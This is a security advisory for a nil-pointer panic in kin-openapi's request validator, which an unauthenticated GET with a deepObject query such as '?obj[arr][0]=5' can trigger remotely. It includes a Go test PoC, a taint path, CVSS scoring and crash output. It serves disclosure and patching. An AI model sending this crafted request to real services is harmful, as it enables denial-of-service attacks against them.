### Summary

An unauthenticated attacker can crash any Go service that uses
`github.com/getkin/kin-openapi/openapi3filter` to validate incoming requests, by
sending a single crafted `GET` request. When a `deepObject` query parameter is
declared with an object schema that contains an **array-typed property whose
`items` is omitted**, the request-decoding path dereferences a nil schema and
panics with a nil-pointer dereference (`runtime error: invalid memory address or
nil pointer dereference`).

Omitting `items` on an array schema is legal in OpenAPI 3.1 and passes
`Document.Validate()`, so a perfectly valid spec is enough to expose the crash —
no attacker control over the spec is required, only over the request.

This is a remotely-triggerable denial of service. Severity: **High (CVSS 3.1
7.5, AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)**. The panic occurs during request
validation, before any authentication result is consumed, so it is reachable by
completely unauthenticated clients.

### Details

The vulnerable code is the `deepObject` object-reconstruction helper
`buildResObj` in `openapi3filter/req_resp_decoder.go`.

When a query string such as `?obj[arr][0]=5` is decoded for a `deepObject`
parameter, `urlValuesDecoder.DecodeObject` builds a nested `map[string]any` and
calls `makeObject`, which calls `buildResObj` to rebuild the value tree
according to the parameter schema. `buildResObj` recurses over the schema:

- For the object property `arr` (schema `{type: array}`), it enters the array
  branch.
- The array branch recurses into its element schema **without checking that
  `Items` is non-nil**:

  ```
  // openapi3filter/req_resp_decoder.go:1028
  r, err := buildResObj(params, mapKeys, strconv.Itoa(i), schema.Value.Items)
  ```

  For an array schema that omits `items`, `schema.Value.Items` is `nil`.

- The recursive call immediately dereferences the nil `SchemaRef` at the top of
  the switch:

  ```
  // openapi3filter/req_resp_decoder.go:1012
  case schema.Value.Type.Is("array"):
  ```

  With `schema == nil`, evaluating `schema.Value` is a nil-pointer dereference,
  and the request goroutine panics.

The full taint path from the public entry point:

```
ValidateRequest
  -> ValidateParameter
    -> decodeStyledParameter            (req_resp_decoder.go:267)
      -> decodeValue                    (req_resp_decoder.go:339, object)
        -> urlValuesDecoder.DecodeObject(req_resp_decoder.go:722, deepObject)
          -> makeObject                 (req_resp_decoder.go:947)
            -> buildResObj              (req_resp_decoder.go:1047, property "arr")
              -> buildResObj            (req_resp_decoder.go:1028, nil Items)
                -> panic                (req_resp_decoder.go:1012)
```

The separate standalone array decoder `parseArray` (around
`req_resp_decoder.go:1144`) *does* guard against a nil `Items`, but the
`deepObject` `buildResObj` reconstruction path has no equivalent guard, so this
input class reaches an unchecked dereference.

### PoC

Steps:

1. Check out the affected library (any released version up to and including
   v0.145.0).
2. Add the following self-contained test as
   `openapi3filter/advisory_poc_test.go`. It builds a valid OpenAPI 3.1
   document, routes one unauthenticated `GET /p?obj[arr][0]=5` request through
   `ValidateRequest`, and reports the panic as a failure.

```go
package openapi3filter_test

import (
	"context"
	"net/http"
	"testing"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const specDeepObjectArrayProp = `
openapi: 3.1.0
info: {title: PoC, version: 1.0.0}
paths:
  /p:
    get:
      parameters:
        - name: obj
          in: query
          style: deepObject
          explode: true
          schema:
            type: object
            properties:
              arr: {type: array}
      responses:
        '200': {description: ok}
`

// TestPoCDeepObjectArrayPropertyPanic fails on vulnerable code: one
// unauthenticated GET request panics the request goroutine.
func TestPoCDeepObjectArrayPropertyPanic(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(specDeepObjectArrayProp))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		t.Fatalf("validate: %v", err)
	}
	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		t.Fatalf("router: %v", err)
	}

	req, _ := http.NewRequest(http.MethodGet, "/p?obj[arr][0]=5", nil)
	route, pathParams, err := router.FindRoute(req)
	if err != nil {
		t.Fatalf("route: %v", err)
	}

	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("VULNERABLE: request handling panicked: %v", r)
		}
	}()
	_ = openapi3filter.ValidateRequest(context.Background(), &openapi3filter.RequestValidationInput{
		Request: req, PathParams: pathParams, Route: route,
		Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
	})
	t.Log("no panic: code appears patched")
}
```

Run:

```
go test ./openapi3filter/ -run TestPoCDeepObjectArrayPropertyPanic -v
```

Observed output on affected code:

```
=== RUN   TestPoCDeepObjectArrayPropertyPanic
    advisory_poc_test.go:56: VULNERABLE: request handling panicked: runtime error: invalid memory address or nil pointer dereference
--- FAIL: TestPoCDeepObjectArrayPropertyPanic (0.00s)
FAIL
FAIL	github.com/getkin/kin-openapi/openapi3filter	0.012s
FAIL
```

The test recovers the panic and reports it as a failure. On patched code (where
the array branch skips or safely handles a nil `Items`), `ValidateRequest`
returns a normal validation error instead of panicking and the test passes.

### Impact

Vulnerability class: reachable nil-pointer dereference / uncaught panic leading
to denial of service (CWE-476 nil-pointer dereference; CWE-20 improper input
validation; CWE-248 uncaught exception).

Who is impacted: any Go application or service that

- serves an OpenAPI 3.x document containing a `deepObject`-styled object query
  parameter with an array-typed property that omits `items`, and
- validates inbound requests with `openapi3filter.ValidateRequest` (directly or
  via a middleware/router integration built on it).

Such an application can be crashed by any client able to send an HTTP request to
the affected route. No authentication, credentials, or special privileges are
required; the panic fires during parameter decoding, before authentication
results are evaluated. A single small request triggers it, so the attack is
trivially repeatable and cheap.

Note on blast radius: under Go's `net/http` server, each connection's serving
goroutine has a built-in `recover`, so a bare `net/http` deployment may survive
individual panics by tearing down the affected connection while logging the
stack. Deployments that call `ValidateRequest` outside that per-connection
recovery (custom servers, worker goroutines, frameworks that do not recover, or
code that treats a panic as fatal) can have the whole process crash, and even
under `net/http` the repeated panics constitute an availability and
log-amplification problem. The CVSS availability impact is scored High
accordingly.

---

- **Ecosystem:** Go
- **Package:** github.com/getkin/kin-openapi
- **Affected versions:** all released versions up to and including v0.145.0 (the
  `deepObject` `buildResObj` array reconstruction never carried a nil-`items`
  guard).
- **CVSS v3.1:** 7.5 (High) — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- **CWE:** primary CWE-476 (NULL Pointer Dereference); also CWE-20 (Improper
  Input Validation) and CWE-248 (Uncaught Exception).
- **Advisory relationship:** Relates to GHSA-p6wj-qrr4-pgh5 (patched in
  v0.143.0). That fix added nil-`items` guards to the urlencoded, multipart,
  header, and standalone `parseArray` decode paths, but did **not** cover the
  `deepObject` `buildResObj` reconstruction path. This is the unfixed sibling of
  the same nil-`items` array-decoding bug class, still exploitable in the latest
  release (v0.145.0).
